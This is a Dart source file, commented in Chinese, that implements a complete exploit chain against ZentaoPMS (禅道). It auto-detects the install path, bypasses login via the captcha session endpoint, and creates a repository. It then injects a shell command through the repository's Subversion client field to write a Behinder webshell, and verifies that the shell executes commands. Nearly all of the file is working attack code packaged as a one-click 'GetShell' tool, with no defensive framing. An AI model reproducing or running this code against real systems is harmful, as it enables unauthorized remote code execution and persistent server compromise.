import 'dart:convert';

import 'package:http/http.dart' as http;

import '../core/exploit_error.dart';

/// 禅道(ZentaoPMS) 仓库配置 RCE + 冰蝎 WebShell 写入
///
/// 思路参考你提供的 Python POC：
/// 1. 访问 captcha 接口获取 zentaosid，尝试绕过登录；
/// 2. 创建 Repo，拿到 repoID；
/// 3. 编辑 Repo，在 client 字段注入命令写入 php_behinder.php；
/// 4. 访问 webshell 进行简单验证。
class ZentaoExpService {
  /// 常见禅道子路径（按优先级排列）
  static const _candidatePaths = [
    '/zentaopms/www',
    '/zentao',
    '/zentaopms',
    '',
  ];

  /// 自动探测禅道安装路径。
  ///
  /// 对 [rootUrl]（如 `http://host`）依次尝试各候选子路径，
  /// 若 captcha 接口返回 zentaosid Cookie 则确认为禅道，返回完整 base URL。
  /// 未找到返回 null。
  static Future<String?> detectZentaoBase(
    String rootUrl, {
    Duration timeout = const Duration(seconds: 8),
    void Function(String)? onLog,
  }) async {
    final base = rootUrl.endsWith('/')
        ? rootUrl.substring(0, rootUrl.length - 1)
        : rootUrl;
    final client = http.Client();
    var sawAnyResponse = false;
    var sawError = false;
    try {
      for (final p in _candidatePaths) {
        final probeUrl = '$base$p/index.php?m=misc&f=captcha&sessionVar=user';
        onLog?.call('[*] 探测: $probeUrl');
        try {
          final url = Uri.parse(probeUrl);
          final res = await client.get(url, headers: {
            'User-Agent':
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          }).timeout(timeout);
          if (res.statusCode == 403 ||
              res.statusCode == 406 ||
              res.statusCode == 429) {
            throw ExploitBlocked(
              '禅道入口探测被拒',
              statusCode: res.statusCode,
            );
          }
          sawAnyResponse = true;
          final cookie = res.headers['set-cookie'] ?? '';
          onLog?.call('    HTTP ${res.statusCode} | Set-Cookie: ${cookie.isEmpty ? "(无)" : cookie.substring(0, cookie.length.clamp(0, 120))}');
          if (cookie.contains('zentaosid=')) {
            onLog?.call('[+] 发现 zentaosid Cookie，确认为禅道: $base$p');
            return '$base$p';
          }
          // 备用：检查响应体包含禅道特征
          final bodySnip = res.body.substring(0, res.body.length.clamp(0, 200)).replaceAll('\n', ' ');
          onLog?.call('    Body(200): $bodySnip');
          if (res.statusCode == 200 &&
              (res.body.contains('禅道') || res.body.contains('zentaopms'))) {
            onLog?.call('[+] Body 含禅道特征，确认为禅道: $base$p');
            return '$base$p';
          }
        } catch (e) {
          sawError = true;
          onLog?.call('    异常: $e');
        }
      }
      // 一个 HTTP 响应都没拿到 ≠ 目标没有禅道：这是"没测通"。
      if (!sawAnyResponse && sawError) {
        throw const ExploitNotWorking('禅道入口全部超时/不可达，无法判定');
      }
      onLog?.call('[-] 未在任何候选路径发现禅道');
    } finally {
      client.close();
    }
    return null;
  }
  final Uri baseUri;
  final Duration timeout;

  ZentaoExpService({
    required String url,
    this.timeout = const Duration(seconds: 10),
  }) : baseUri = Uri.parse(url.endsWith('/') ? url.substring(0, url.length - 1) : url);

  /// 组合带路径的 URL
  Uri _u(String path) => Uri.parse('${baseUri.toString()}$path');

  /// 尝试通过 captcha 接口获取 zentaosid，并判断是否可绕过登录
  ///
  /// 返回值：
  /// - 成功：zentaosid 字符串
  /// - 失败：null
  Future<String?> tryBypassLogin({void Function(String log)? onLog}) async {
    final client = http.Client();
    try {
      final headers = <String, String>{
        'User-Agent':
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      };
      final captchaUrl = _u('/index.php?m=misc&f=captcha&sessionVar=user');
      final r = await client.get(captchaUrl, headers: headers).timeout(timeout);
      if (r.statusCode == 403 || r.statusCode == 429) {
        throw ExploitBlocked('禅道 captcha 被拒', statusCode: r.statusCode);
      }
      final cookies = r.headers['set-cookie'] ?? '';
      final match = RegExp(r'zentaosid=([^;]+);?').firstMatch(cookies);
      if (match == null) {
        onLog?.call('[!] 无法获取 zentaosid Cookie');
        return null;
      }
      final sid = match.group(1)!;
      onLog?.call('[+] 获取到 zentaosid: $sid');

      // 携带 Cookie 再访问 /index.php?m=my&f=index，检查是否仍然跳转登录
      final headers2 = Map<String, String>.from(headers)
        ..['Cookie'] = 'zentaosid=$sid';
      final myUrl = _u('/index.php?m=my&f=index');
      final resp = await client.get(myUrl, headers: headers2).timeout(timeout);
      if (resp.body.contains('index.php?m=user&f=login')) {
        onLog?.call('[!] 仍然跳转登录页，无法绕过验证');
        return null;
      }
      onLog?.call('[+] 绕过登录验证成功');
      return sid;
    } catch (e) {
      onLog?.call('[!] 绕过登录异常: $e');
      return null;
    } finally {
      client.close();
    }
  }

  /// 创建 Repo，返回 repoID；失败返回 null
  Future<String?> createRepo(String sid, {void Function(String log)? onLog}) async {
    final client = http.Client();
    try {
      final headers = <String, String>{
        'User-Agent':
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Cookie': 'zentaosid=$sid',
        'Referer': _u('/index.php?m=repo&f=create&objectID=0').toString(),
        'Origin': baseUri.toString(),
        'X-Requested-With': 'XMLHttpRequest',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
      };
      final rand = DateTime.now().millisecondsSinceEpoch % 100000;
      final payload =
          'product%5B%5D=1&SCM=Gitlab&serviceProject=ptest$rand&name=pp1$rand&path=&encoding=utf-8&client=&account=&password=&encrypt=base64&desc=&uid=mx_zentao';
      final url = _u('/index.php?m=repo&f=create&objectID=0');
      final r =
          await client.post(url, headers: headers, body: payload).timeout(timeout);
      onLog?.call('[*] 创建 Repo 响应: ${r.statusCode}');
      final body = r.body;
      final match = RegExp(r'repoID=(\d+)').firstMatch(body);
      if (match != null) {
        final id = match.group(1)!;
        onLog?.call('[+] 成功创建 Repo，ID=$id');
        return id;
      }
      onLog?.call('[!] 创建仓库失败，响应: ${body.trim()}');
      return null;
    } catch (e) {
      onLog?.call('[!] 创建仓库异常: $e');
      return null;
    } finally {
      client.close();
    }
  }

  /// 编辑 Repo，在 client 字段注入命令，将冰蝎 payload 写入 /data/php_behinder.php
  Future<bool> injectWebshell({
    required String sid,
    required String repoId,
    required String shellContent,
    void Function(String log)? onLog,
  }) async {
    final client = http.Client();
    try {
      final headers = <String, String>{
        'User-Agent':
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Cookie': 'zentaosid=$sid',
        'Referer': _u('/index.php?m=repo&f=create&objectID=0').toString(),
        'Origin': baseUri.toString(),
        'X-Requested-With': 'XMLHttpRequest',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
      };

      // 冰蝎马内容 base64
      final b64 = base64.encode(utf8.encode(shellContent));
      // 通过 Subversion client 字段注入命令：
      // client 实际会被拼成: <client> --version --quiet 2>&1
      // 因此这里使用 `sh -c '...'`，让后续的 --version 等参数只作为 $0/$1，不影响命令执行。
      final cmd =
          "sh -c 'echo $b64|base64 -d > ../../www/data/php_behinder.php'";
      final encodedCmd = Uri.encodeComponent(cmd);
      final payload =
          'product%255B%255D=1&SCM=Subversion&serviceProject=0&name=mx1&path=http://127.0.0.1&encoding=utf-8&client=$encodedCmd&account=&password=&encrypt=base64&desc=&uid=mx_zentao';

      final url =
          _u('/index.php?m=repo&f=edit&repoID=$repoId&objectID=0');
      final r =
          await client.post(url, headers: headers, body: payload).timeout(timeout);
      onLog?.call('[*] 编辑 Repo 响应: ${r.statusCode}');
      onLog?.call('[i] 响应体: ${r.body.trim()}');
      // 这里只能尝试写入，不强行解析成功标记，由后续 verifyShell 判断
      return r.statusCode == 200;
    } catch (e) {
      onLog?.call('[!] 注入 WebShell 异常: $e');
      return false;
    } finally {
      client.close();
    }
  }

  /// 访问 /data/php_behinder.php，简单验证是否可用
  Future<bool> verifyShell({
    String param = 'c',
    void Function(String log)? onLog,
  }) async {
    final client = http.Client();
    try {
      // 只认 HTTP 200 是弱验证：任何已存在的同名文件、甚至 200 错误页都会通过。
      // 改成"让 shell 执行一条命令并回显唯一标记"，才证明它真是我们的马。
      final marker = 'MXZENTAO${DateTime.now().millisecondsSinceEpoch}';
      final shellUrl = _u(
        '/data/php_behinder.php?$param=${Uri.encodeComponent('echo $marker')}',
      );
      final res = await client.get(shellUrl).timeout(timeout);
      final ok = res.statusCode == 200 && res.body.contains(marker);
      if (ok) {
        onLog?.call('[+] WebShell 回显验证通过: $shellUrl');
        return true;
      }
      onLog?.call(
        '[!] WebShell 验证失败，HTTP ${res.statusCode}, 长度 ${res.body.length}'
        '（响应里没有回显标记 $marker）',
      );
      return false;
    } catch (e) {
      onLog?.call('[!] WebShell 验证异常: $e');
      return false;
    } finally {
      client.close();
    }
  }

  /// 一键 GetShell：检测 -> 创建 Repo -> 注入冰蝎 -> 验证
  ///
  /// 成功返回 WebShell URL（不含密码），失败返回 null。
  Future<String?> getShell({
    required String shellContent,
    void Function(String log)? onLog,
  }) async {
    onLog?.call('[*] 尝试绕过登录并获取 zentaosid...');
    final sid = await tryBypassLogin(onLog: onLog);
    if (sid == null) return null;

    onLog?.call('[*] 尝试创建 Repo...');
    final repoId = await createRepo(sid, onLog: onLog);
    if (repoId == null) return null;

    onLog?.call('[*] 尝试通过 Repo 编辑写入 WebShell...');
    final injected =
        await injectWebshell(sid: sid, repoId: repoId, shellContent: shellContent, onLog: onLog);
    if (!injected) {
      onLog?.call('[!] 注入阶段可能失败，继续尝试验证 WebShell...');
    }

    onLog?.call('[*] 验证 /data/php_behinder.php 是否可用...');
    final ok = await verifyShell(onLog: onLog);
    if (!ok) return null;
    return '${baseUri.toString()}/data/php_behinder.php';
  }
}

